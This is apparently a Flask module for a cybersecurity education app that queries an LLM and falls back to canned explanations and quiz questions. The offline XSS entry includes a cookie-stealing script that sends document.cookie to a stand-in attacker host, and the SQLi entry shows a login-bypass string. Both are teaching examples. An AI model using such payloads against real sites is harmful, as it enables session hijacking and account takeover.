from flask import Blueprint, request, jsonify, session
import os
import requests
import json
from dotenv import load_dotenv
from database import get_db

load_dotenv()

ai_bp = Blueprint('ai', __name__)

GROQ_API_KEY = os.getenv("GROQ_API_KEY")

def get_groq_response(system_prompt, user_prompt):
    if not GROQ_API_KEY or GROQ_API_KEY.startswith("your_"):
        raise ValueError("Invalid or missing GROQ_API_KEY configuration.")

    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {GROQ_API_KEY}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "llama-3.3-70b-versatile",
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ],
        "response_format": {"type": "json_object"},
        "temperature": 0.6
    }
    
    response = requests.post(url, headers=headers, json=payload, timeout=20)
    response.raise_for_status()
    res_json = response.json()
    content_str = res_json['choices'][0]['message']['content']
    return json.loads(content_str)

# offline fallbacks in case Groq is unavailable or fails
OFFLINE_EXPLANATIONS = {
    "sql injection": {
        "definition": "SQL Injection (SQLi) is a database vulnerability that occurs when an attacker inserts malicious SQL code into input fields, causing the application to execute arbitrary SQL commands.",
        "example": "An attacker enters `' OR '1'='1` in the username field of a login form to bypass authorization checks.",
        "impact": "Attackers can bypass authentication, read sensitive database contents, modify or delete database entries, and sometimes obtain administrator rights.",
        "prevention": "Always use prepared statements (parameterized queries), implement strict input validation, and use ORM tools like SQLAlchemy instead of raw queries."
    },
    "xss": {
        "definition": "Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious client-side scripts (typically JavaScript) into web pages viewed by other users.",
        "example": "An attacker posts a comment containing `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` on a blog page.",
        "impact": "Execution of arbitrary JS in the user's browser, leading to session hijacking, credential theft, or page defacement.",
        "prevention": "Sanitize all user-supplied input, use HTML entity escaping for dynamic output, and implement a strict Content Security Policy (CSP)."
    },
    "csrf": {
        "definition": "Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user's web browser to send a forged HTTP request to a vulnerable web application.",
        "example": "A user visits a malicious website while logged into their bank, and the malicious site triggers a hidden request to transfer funds.",
        "impact": "Unauthorized actions are performed on behalf of the victim, such as updating profile details, changing passwords, or transferring funds.",
        "prevention": "Use anti-CSRF tokens in forms, verify Referer/Origin headers, and use the 'SameSite=Strict' cookie attribute."
    },
    "networking": {
        "definition": "Computer Networking security involves protecting data as it travels across networks, safeguarding both the network infrastructure and the endpoints.",
        "example": "An attacker uses a packet sniffer (like Wireshark) on an unencrypted public Wi-Fi network to intercept passwords sent over HTTP.",
        "impact": "Data interception (Man-in-the-Middle attacks), eavesdropping, unauthorized network access, and denial of service (DoS).",
        "prevention": "Encrypt all network traffic using HTTPS and VPNs, set up robust firewalls, and use secure protocols like SSH and SFTP."
    },
    "password security": {
        "definition": "Password Security refers to the practices and mechanisms used to ensure passwords are resilient against brute-force attacks, dictionary attacks, and unauthorized access.",
        "example": "An attacker performs a credential stuffing attack, trying millions of weak passwords (e.g. '123456', 'password') against a website.",
        "impact": "Unauthorized account takeovers, theft of personal information, and identity theft.",
        "prevention": "Enforce strong password policies (min 12 characters, mix of character types), salt and hash passwords using bcrypt or Argon2, and implement Multi-Factor Authentication (MFA)."
    },
    "blockchain": {
        "definition": "Blockchain security is the risk management system for a blockchain network, securing nodes, transactions, and smart contracts from exploitation.",
        "example": "An attacker exploits a reentrancy vulnerability in a Solidity smart contract to drain funds from a decentralized application (DApp).",
        "impact": "Financial loss, theft of cryptocurrency assets, and loss of trust in decentralized protocols.",
        "prevention": "Perform rigorous audits of smart contracts, limit access to sensitive ledger methods, and implement secure standard contract templates (e.g., OpenZeppelin)."
    }
}

OFFLINE_QUIZZES = {
    "sql injection": {
        "question": "Which of the following methods is the MOST effective defense against SQL Injection vulnerabilities?",
        "options": [
            "Encrypting the database content at rest",
            "Using parameterized queries (prepared statements)",
            "Restricting website access to HTTPS only",
            "Replacing all double quotes with single quotes manually"
        ],
        "correct_answer": "Using parameterized queries (prepared statements)",
        "explanation": "Parameterized queries compile the SQL query template first, treating user input purely as parameters, preventing the database engine from executing dynamic code injected via the parameters."
    },
    "xss": {
        "question": "What is the primary mechanism of a Stored Cross-Site Scripting (XSS) attack?",
        "options": [
            "The attacker intercepts traffic on a local network to steal session tokens.",
            "The attacker injects a script that is saved in the server's database and served to future visitors.",
            "The attacker sends a link with malicious payload that is immediately reflected back in the page response.",
            "The attacker forces the victim's browser to send a transfer request to another website."
        ],
        "correct_answer": "The attacker injects a script that is saved in the server's database and served to future visitors.",
        "explanation": "Stored (or Persistent) XSS occurs when a malicious script is permanently stored on a target server (e.g., in a database). When a victim requests the stored information, the script is served and executed in their browser."
    },
    "csrf": {
        "question": "How does an Anti-CSRF token protect a web form from Cross-Site Request Forgery?",
        "options": [
            "It encrypts the entire request payload to prevent sniffing.",
            "It generates a unique, unpredictable value tied to the user's session that must be submitted with forms.",
            "It checks the user's IP address against a whitelist before accepting form data.",
            "It automatically logs the user out if they visit an external link."
        ],
        "correct_answer": "It generates a unique, unpredictable value tied to the user's session that must be submitted with forms.",
        "explanation": "Anti-CSRF tokens are unique, secret values tied to the user session. Since a malicious external site cannot read the token (due to Same-Origin Policy), any forged request they trigger will fail authentication because it lacks the valid token."
    },
    "networking": {
        "question": "Which protocol provides secure, encrypted shell access to a remote Unix server over the internet?",
        "options": [
            "Telnet",
            "FTP",
            "SSH (Secure Shell)",
            "HTTP"
        ],
        "correct_answer": "SSH (Secure Shell)",
        "explanation": "SSH (Secure Shell) uses cryptographic handshakes and encryption to establish a secure terminal session, replacing insecure plaintext protocols like Telnet."
    },
    "password security": {
        "question": "Why is hashing passwords with a salt recommended over hashing passwords without a salt?",
        "options": [
            "It makes the password hashing algorithm run faster.",
            "It prevents attackers from using precomputed dictionary attacks (rainbow tables) to crack identical passwords.",
            "It encrypts the password so it can be decrypted and sent back to the user on request.",
            "It compresses the password to take up less database storage."
        ],
        "correct_answer": "It prevents attackers from using precomputed dictionary attacks (rainbow tables) to crack identical passwords.",
        "explanation": "A salt is a unique random value added to each password before hashing. Even if two users choose the same password, their hashes will be different. This prevents attackers from using rainbow tables (precomputed lists of hashes) to crack multiple passwords at once."
    },
    "blockchain": {
        "question": "What type of attack involves an attacker gaining control of more than 50% of a blockchain network's mining power or validation stake?",
        "options": [
            "Reentrancy Attack",
            "Sybil Attack",
            "51% Attack",
            "Front-running Attack"
        ],
        "correct_answer": "51% Attack",
        "explanation": "A 51% attack occurs when a single entity or pool controls more than 50% of the network's computing power or validation stake, allowing them to reverse transactions, double-spend, and block new blocks from being confirmed."
    }
}

@ai_bp.route('/ask-ai', methods=['POST'])
def ask_ai():
    # Check session/user authentication
    user_id = session.get('user_id')
    
    data = request.get_json() or {}
    question = data.get('question', '').strip()
    
    if not question:
        return jsonify({'success': False, 'error': 'Question cannot be empty.'}), 400

    system_prompt = (
        "You are an expert AI Cybersecurity Assistant. Answer the user's cybersecurity question.\n"
        "Your response MUST be a valid JSON object matching the following structure exactly:\n"
        "{\n"
        "  \"definition\": \"A clear, simple explanation of the concept.\",\n"
        "  \"example\": \"A concrete, real-world example or scenario.\",\n"
        "  \"impact\": \"The potential consequences and severity.\",\n"
        "  \"prevention\": \"Practical steps and mitigation methods to secure against it.\"\n"
        "}\n"
        "Do not include any Markdown fencing, backticks, or explanation outside this JSON. Return only the JSON object."
    )
    
    # Try calling Groq API
    try:
        result = get_groq_response(system_prompt, question)
        return jsonify({
            'success': True,
            'source': 'groq',
            'data': result
        })
    except Exception as e:
        print(f"Groq API error: {str(e)}. Falling back to offline dictionary.")
        # Attempt fallback matching
        q_lower = question.lower()
        matched_data = None
        for key, val in OFFLINE_EXPLANATIONS.items():
            if key in q_lower or q_lower in key:
                matched_data = val
                break
        
        if not matched_data:
            # General fallback if no keyword matches
            matched_data = {
                "definition": f"Explanation for '{question}': This is a cybersecurity topic related to information safety, network defense, or application security.",
                "example": "An attacker exploits vulnerabilities in system configurations or applications to gain unauthorized access.",
                "impact": "Data breaches, loss of integrity, service disruptions, or identity theft.",
                "prevention": "Ensure all software is patched, use strong access controls, and apply regular audits and monitoring."
            }
            
        return jsonify({
            'success': True,
            'source': 'offline_fallback',
            'data': matched_data
        })

@ai_bp.route('/quiz', methods=['POST'])
def generate_quiz():
    data = request.get_json() or {}
    topic = data.get('topic', '').strip()
    
    if not topic:
        return jsonify({'success': False, 'error': 'Topic is required.'}), 400

    system_prompt = (
        f"You are a cybersecurity educator. Generate a single, multiple-choice quiz question on the topic: '{topic}'.\n"
        "Your response MUST be a valid JSON object matching the following structure exactly:\n"
        "{\n"
        "  \"question\": \"The question text, designed for undergraduate students.\",\n"
        "  \"options\": [\n"
        "    \"Option A text\",\n"
        "    \"Option B text\",\n"
        "    \"Option C text\",\n"
        "    \"Option D text\"\n"
        "  ],\n"
        "  \"correct_answer\": \"One of the option strings exactly matching the correct option.\",\n"
        "  \"explanation\": \"A brief explanation of why the correct option is right.\"\n"
        "}\n"
        "Make sure 'correct_answer' matches one of the values in 'options' exactly. Do not wrap the output in Markdown."
    )
    
    try:
        result = get_groq_response(system_prompt, f"Generate a quiz question about {topic}.")
        return jsonify({
            'success': True,
            'source': 'groq',
            'data': result
        })
    except Exception as e:
        print(f"Groq API error: {str(e)}. Falling back to offline quiz.")
        # Fallback to predefined quiz
        topic_key = topic.lower().replace(" ", "_")
        matched_quiz = OFFLINE_QUIZZES.get(topic_key)
        
        if not matched_quiz:
            # General fallback if topic doesn't match
            matched_quiz = OFFLINE_QUIZZES["sql injection"] # default fallback
            
        return jsonify({
            'success': True,
            'source': 'offline_fallback',
            'data': matched_quiz
        })
